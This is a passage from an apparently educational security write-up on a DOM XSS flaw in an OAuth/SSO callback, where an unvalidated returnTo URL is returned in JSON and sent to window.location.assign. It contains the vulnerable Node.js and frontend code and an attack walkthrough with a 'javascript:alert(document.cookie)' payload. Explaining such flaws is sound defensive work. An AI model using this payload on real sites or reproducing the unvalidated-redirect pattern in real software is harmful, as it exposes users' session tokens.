    let state = req.query.state;

    try {
        // Retrieve temporary session state based on the OAuth state parameter
        let authState = await redis.get(`oauth:state:${state}`);
        let parsedState = JSON.parse(authState);

        let token = await IdentityProvider.exchangeCode(code);

        // [1]
        // [2]
        // Optimization: Avoiding HTTP 302 redirects to support SPA and Mobile WebViews seamlessly.
        // [3]
        // [4]
        // The backend implicitly assumes that because the response is strictly serialized as JSON, 
        // the returnTo parameter is mathematically incapable of executing HTML/XSS.
        res.json({
            status: 'Authenticated',
            token: token,
            nextUrl: parsedState.returnTo // Attacker-controlled protocol (e.g., javascript:)
        });
    } catch (err) {
        res.status(401).json({ error: 'Authentication failed' });
    }
});

// Frontend Execution Sink (app.js):
// fetch('/api/v1/auth/callback?code=...').then(r => r.json()).then(data => {
//    localStorage.setItem('token', data.token);
//    window.location.assign(data.nextUrl); // Blind DOM Execution Sink
// });
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] To deliver a unified, frictionless authentication experience across fragmented frontend platforms (SPAs, iOS, Android), architects modernized the OAuth callback lifecycle, replacing legacy HTTP Redirects with asynchronous JSON responses, \[2] When the OAuth flow initiates, the backend caches the user's intended destination (`return_to` parameter) in temporary storage, guaranteeing it survives the multi-hop Identity Provider redirection sequence, \[3] The architecture relies entirely on Content-Type boundaries for XSS mitigation. Developers correctly assume that returning an untrusted string inside an `application/json` payload neutralizes standard Reflected XSS, \[4] The execution sink. The developers failed to recognize that shifting routing mechanics into the JSON payload abstracted away the browser's native protocol security layer. Browsers explicitly forbid executing `javascript:` URIs returned in HTTP `Location` headers. By encapsulating the malicious protocol string within JSON, the backend served as an obfuscation tunnel. When the frontend SPA received the JSON, it dynamically extracted the URL and plunged it directly into a `window.location` sink. This blind client-side execution bypassed protocol validation entirely, triggering instantaneous DOM XSS immediately upon successful authentication

```http
// 1. Attacker constructs a malicious URL to initiate the SSO flow.
// They inject a javascript: URI scheme into the return_to parameter.
// Target: https://auth.enterprise.tld/api/v1/auth/login?return_to=javascript:alert(document.cookie)

// 2. The Attacker sends this link to a victim (or embeds it in an iframe if X-Frame-Options allows).
// 3. The victim clicks the link. The API Gateway intercepts the request.
// 4. The backend stores the return_to value in Redis against a temporary state hash.
// 5. The backend redirects the victim to the external Identity Provider (Okta/Auth0).
// 6. The victim logs in successfully and is redirected back to the enterprise callback URL.

GET /api/v1/auth/callback?code=abc123auth&state=state_88192 HTTP/1.1
Host: api.enterprise.tld

// 7. The backend exchanges the code, verifies the session, and retrieves the stored state.
// 8. The backend returns the JSON response:

HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "Authenticated",
  "token": "eyJhbGciOiJIUzI1NiIsIn...",
  "nextUrl": "javascript:alert(document.cookie)"
}

// 9. The SPA's Javascript executes:
// fetch(...).then(res => res.json()).then(data => {
//    localStorage.setItem('auth_token', data.token);
//    window.location.assign(data.nextUrl);
// });

// 10. The browser evaluates `window.location.assign("javascript:alert(document.cookie)")`.
// 11. The Javascript executes immediately, exfiltrating the victim's session tokens or executing 
//     authenticated API requests on the attacker's behalf.
```
{% endstep %}

{% step %}
To unify authentication routing across disparate client platforms and eliminate state-destroying HTTP 302 redirects, architects implemented asynchronous SSO callbacks. This optimization shifted navigational authority from the HTTP Transport Layer directly into the application's JSON data payloads. The security vulnerability emerged from an architectural blind spot regarding Protocol Ignorance. Backend developers correctly ensured that the payload structure immunized against Reflected XSS, but they failed to enforce strict URL protocol whitelisting (requiring `http://` or `https://`). By encapsulating an attacker-supplied `javascript:` URI inside a JSON envelope, the backend bypassed the browser's native HTTP location safety mechanisms. The frontend SPA, explicitly designed to consume and execute the backend's routing instructions, blindly piped the unvalidated protocol string into a native DOM navigation sink. This architectural handover successfully transformed a generic redirect parameter into a devastating, fully authenticated DOM XSS vector
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
